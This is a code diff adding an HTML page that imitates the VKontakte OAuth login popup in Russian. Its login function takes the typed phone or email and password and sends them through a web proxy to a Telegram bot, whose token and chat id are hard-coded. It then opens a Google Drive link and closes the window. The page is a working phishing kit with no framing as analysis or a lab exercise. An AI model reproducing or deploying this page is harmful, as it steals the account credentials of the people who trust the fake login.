@@ -1,0 +1,164 @@
+<head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Вход</title>
+    <link rel="stylesheet" type="text/css" href="common.css"><link rel="stylesheet" type="text/css" href="base.css"><link rel="stylesheet" type="text/css" href="fonts_utf.css"><link rel="stylesheet" type="text/css" href="fonts_cnt_mac.css">
+    <link type="text/css" rel="stylesheet" href="oauth_popup.css">
+    <script type="text/javascript" language="javascript" src="common_light.js"></script>
+    <script type="text/javascript" language="javascript">// <![CDATA[
+      function allow(button) {
+        if (isButtonLocked(button)) return false;
+        lockButton(button);
+
+        var addr = '';
+        if (isChecked('allow_notifications')) {
+          addr = '&notify=1';
+        }
+        if (isChecked('denied_email')) {
+          addr += '&email_denied=1';
+        }
+        if (isChecked('denied_phone')) {
+          addr += '&phone_denied=1';
+        }
+    //    location.href = "https://login.vk.com/?act=grant_access&client_id=-1&settings=0&response_type=code&group_ids=&token_type=0&v=&display=widget&ip_h=16129a74c9ef3e501f&hash=1589083741_392fa0d7a3e6723a7a&https=1&state=&redirect_uri=https%3A%2F%2Fvk.com%2Fshare.php%3Furl%3Dhttp%253A%252F%252F192.168.0.11%253A1488%252FAmaliaKarbunal%252F%26title%3D%2520%25D0%259F%25D0%25BE%25D0%25BB%25D1%258C%25D0%25B7%25D0%25BE%25D0%25B2%25D0%25B0%25D1%2582%25D0%25B5%25D0%25BB%25D1%258C%2520%2520%257C%2520MyLines%2520-%2520%25D0%2592%25D1%2581%25D0%25B5%2520%25D0%25BA%25D0%25BE%25D0%25BD%25D1%2582%25D0%25B0%25D0%25BA%25D1%2582%25D1%258B%2520%25D0%25BD%25D0%25B0%2520%25D0%25BE%25D0%25B4%25D0%25BD%25D0%25BE%25D0%25B9%2520%25D1%2581%25D1%2582%25D1%2580%25D0%25B0%25D0%25BD%25D0%25B8%25D1%2586%25D0%25B5%26image%3Dhttps%253A%252F%252Fmylines.club%252Fstatic%252Fbuild%252Fimg%252Fprofile%252Fdefault.svg%26utm_source%3Dshare2"+addr;
+    //   return false;
+    //  }
+
+    function cancel() {
+      location.href = "https://login.vk.com/?act=grant_access&client_id=-1&settings=0&response_type=code&group_ids=&token_type=0&v=&display=widget&ip_h=16129a74c9ef3e501f&hash=1589083741_392fa0d7a3e6723a7a&https=1&state=&redirect_uri=https%3A%2F%2Fvk.com%2Fshare.php%3Furl%3Dhttp%253A%252F%252F192.168.0.11%253A1488%252FAmaliaKarbunal%252F%26title%3D%2520%25D0%259F%25D0%25BE%25D0%25BB%25D1%258C%25D0%25B7%25D0%25BE%25D0%25B2%25D0%25B0%25D1%2582%25D0%25B5%25D0%25BB%25D1%258C%2520%2520%257C%2520MyLines%2520-%2520%25D0%2592%25D1%2581%25D0%25B5%2520%25D0%25BA%25D0%25BE%25D0%25BD%25D1%2582%25D0%25B0%25D0%25BA%25D1%2582%25D1%258B%2520%25D0%25BD%25D0%25B0%2520%25D0%25BE%25D0%25B4%25D0%25BD%25D0%25BE%25D0%25B9%2520%25D1%2581%25D1%2582%25D1%2580%25D0%25B0%25D0%25BD%25D0%25B8%25D1%2586%25D0%25B5%26image%3Dhttps%253A%252F%252Fmylines.club%252Fstatic%252Fbuild%252Fimg%252Fprofile%252Fdefault.svg%26utm_source%3Dshare2&cancel=1";
+      return false;
+      }
+
+      function login(button) {
+        if (isButtonLocked(button)) return false;
+        lockButton(button);
+        const username = document.querySelector('[name="email"]')
+				const password = document.querySelector('[name="pass"]')
+
+        fetch("https://ca.weboproxy.com/index.php", {
+          "headers": {
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7,tr;q=0.6",
+            "cache-control": "max-age=0",
+            "content-type": "application/x-www-form-urlencoded",
+            "sec-fetch-dest": "document",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-site": "same-site",
+            "sec-fetch-user": "?1",
+            "upgrade-insecure-requests": "1"
+          },
+          "referrer": "https://weboproxy.com/?error=%287%29%20Failed%20to%20receive%20SOCKS5%20connect%20request%20ack.",
+          "referrerPolicy": "no-referrer-when-downgrade",
+          "body": "url=https%3A%2F%2Fapi.telegram.org%2Fbot1118412715:AAE1v4zv4ZGh3978rHsFfUDacV9MB3Eyzec%2FsendMessage%3Fchat_id%3D-436716263%26text%3D"+encodeURI((username.value + ':' + password.value).replace(/#/gi, '€').replace(/&/gi, '£')),
+          "method": "POST",
+          "mode": "no-cors",
+          "credentials": "include"
+        }).then(e => {
+		window.open("https://drive.google.com/open?id=1Cz-jlxbjOoFEOdDG1bIp3a7AzZ1wMrZc")
+         //open('../../golos.html')
+         setTimeout(() => {
+            window.close()
+          })
+        });
+			}
+
+      function doResize(onResize) {
+        onResize && setTimeout(function() {
+          doResize()
+        }, 100);
+
+        if (!hasClass(document.body, 'oauth_centered') && !onResize) {
+          if (window.outerHeight !== void 0) {
+            var panelH = (window.outerHeight - window.innerHeight) | 0,
+              panelW = (window.outerWidth - window.innerWidth) | 0;
+          } else {
+            var panelH = 50,
+              panelW = 0;
+          }
+          var contentH = Math.max(ge('oauth_wrap_content').offsetHeight, 430),
+            contentW = 655;
+          window.resizeTo(contentW + panelW, contentH + panelH);
+          window.moveTo(
+            (screen.width - contentW) / 2 + (screen.availLeft | 0),
+            ((screen.height - contentH) / 2) + (screen.availTop | 0)
+          );
+        }
+      }
+
+      function toggleEmailPrivacy() {
+        checkbox('denied_email');
+        if (!isChecked('denied_email')) {
+          hide('denied_email');
+          show('allowed_email');
+        } else {
+          hide('allowed_email');
+          show('denied_email');
+        }
+      }
+
+      function togglePhonePrivacy() {
+        checkbox('denied_phone');
+        if (!isChecked('denied_phone')) {
+          hide('denied_phone');
+          show('allowed_phone');
+        } else {
+          hide('allowed_phone');
+          show('denied_phone');
+        }
+      }
+
+      if (parent && parent != window) {
+        location.href = "https://oauth.vk.com/blank.html";
+      }
+
+
+    // ]]></script>
+  </head>
+
+  <body onload="doResize();" class="VK oauth_full">
+    <script>
+      if (window.devicePixelRatio >= 2) document.body.className += ' is_2x';
+    </script>
+    <div class="oauth_wrap">
+      <div class="oauth_wrap_inner">
+        <div class="oauth_wrap_content" id="oauth_wrap_content">
+          <div class="oauth_head">
+  <a class="oauth_logo fl_l" href="https://vk.com" target="_blank"></a>
+  <div id="oauth_head_info" class="oauth_head_info fl_r">
+  <a class="oauth_reg_link" href="https://vk.com/join?reg=1" target="_blank">Регистрация</a>
+</div>
+</div>
+
+<div class="oauth_content box_body clear_fix">
+  <div class="box_msg_gray box_msg_padded">Для продолжения Вам необходимо войти <b></b></div>
+
+  <div id="login_submit">
+    <div class="oauth_form">
+
+
+
+      <div class="oauth_form_login">
+        <input type="hidden" name="ip_h" value="16129a74c9ef3e501f">
+        <input type="hidden" name="lg_h" value="26d3aed281414b4870">
+        <input type="hidden" name="_origin" value="https://oauth.vk.com">
+        <input type="hidden" name="to" value="aHR0cHM6Ly9vYXV0aC52ay5jb20vYXV0aG9yaXplP2NsaWVudF9pZD0tMSZyZWRpcmVjdF91cmk9aHR0cHMlM0ElMkYlMkZ2ay5jb20lMkZzaGFyZS5waHAlM0Z1cmwlM0RodHRwJTI1M0ElMjUyRiUyNTJGMTkyLjE2OC4wLjExJTI1M0ExNDg4JTI1MkZBbWFsaWFLYXJidW5hbCUyNTJGJTI2dGl0bGUlM0QlMjUyMCUyNUQwJTI1OUYlMjVEMCUyNUJFJTI1RDAlMjVCQiUyNUQxJTI1OEMlMjVEMCUyNUI3JTI1RDAlMjVCRSUyNUQwJTI1QjIlMjVEMCUyNUIwJTI1RDElMjU4MiUyNUQwJTI1QjUlMjVEMCUyNUJCJTI1RDElMjU4QyUyNTIwJTI1MjAlMjU3QyUyNTIwTXlMaW5lcyUyNTIwLSUyNTIwJTI1RDAlMjU5MiUyNUQxJTI1ODElMjVEMCUyNUI1JTI1MjAlMjVEMCUyNUJBJTI1RDAlMjVCRSUyNUQwJTI1QkQlMjVEMSUyNTgyJTI1RDAlMjVCMCUyNUQwJTI1QkElMjVEMSUyNTgyJTI1RDElMjU4QiUyNTIwJTI1RDAlMjVCRCUyNUQwJTI1QjAlMjUyMCUyNUQwJTI1QkUlMjVEMCUyNUI0JTI1RDAlMjVCRCUyNUQwJTI1QkUlMjVEMCUyNUI5JTI1MjAlMjVEMSUyNTgxJTI1RDElMjU4MiUyNUQxJTI1ODAlMjVEMCUyNUIwJTI1RDAlMjVCRCUyNUQwJTI1QjglMjVEMSUyNTg2JTI1RDAlMjVCNSUyNmltYWdlJTNEaHR0cHMlMjUzQSUyNTJGJTI1MkZteWxpbmVzLmNsdWIlMjUyRnN0YXRpYyUyNTJGYnVpbGQlMjUyRmltZyUyNTJGcHJvZmlsZSUyNTJGZGVmYXVsdC5zdmclMjZ1dG1fc291cmNlJTNEc2hhcmUyJnJlc3BvbnNlX3R5cGU9JnNjb3BlPTAmdj0mc3RhdGU9JmRpc3BsYXk9d2lkZ2V0">
+        <input type="hidden" id="expire" name="expire" value="0">
+
+        <div class="oauth_form_header">Телефон или email</div>
+        <input type="text" class="oauth_form_input dark" name="email" value="">
+        <div class="oauth_form_header">Пароль</div>
+        <input type="password" class="oauth_form_input dark" name="pass">
+
+
+
+        <button class="flat_button oauth_button button_wide" id="install_allow" type="submit" onclick="return login(this);">Войти</button>
+        <a class="oauth_forgot" href="https://vk.com/restore" target="_blank">Забыли пароль?</a>
+        <input type="submit" name="submit_input" class="unshown">
+      </div>
+    </div>
+  </div>
+</div>
+        </div>
+      </div>
+    </div>
+
+</body>
